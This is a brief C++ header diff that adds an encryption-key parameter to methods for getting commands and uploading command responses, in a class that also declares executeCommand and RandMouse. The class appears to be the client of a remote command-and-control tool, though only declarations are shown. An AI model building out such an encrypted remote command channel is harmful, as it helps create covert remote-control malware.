@@ -62,11 +62,11 @@ public:
 
     void RandMouse();
 
-    std::vector<std::string> getCommands();
+    std::vector<std::string> getCommands(const std::string &encryptionKey);
 
     std::string executeCommand(std::string command);
 
-    void uploadCommandsResponse(std::string);
+    void uploadCommandsResponse(std::string output, const std::string &encryptionKey);
 
 };
 
